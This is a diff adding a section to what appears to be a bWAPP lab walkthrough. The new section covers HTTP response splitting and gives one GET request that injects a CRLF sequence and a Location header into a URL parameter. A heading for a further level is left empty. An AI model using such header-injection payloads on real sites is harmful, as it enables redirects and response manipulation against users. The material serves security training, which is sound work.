@@ -225,3 +225,13 @@ Below are the request that should be made for Open Redirection .
     return $hpp_detected;
     }
     ```
+
+## HTTP Response Splitting(CRLF Injection)
+
+- Security-Level : Low
+
+    ```
+    GET /bWAPP/http_response_splitting.php?url=http://itsecgames.blogspot.com%0d%0aLocation=https://google.com
+    ```
+
+- Security-Level : Mediumm
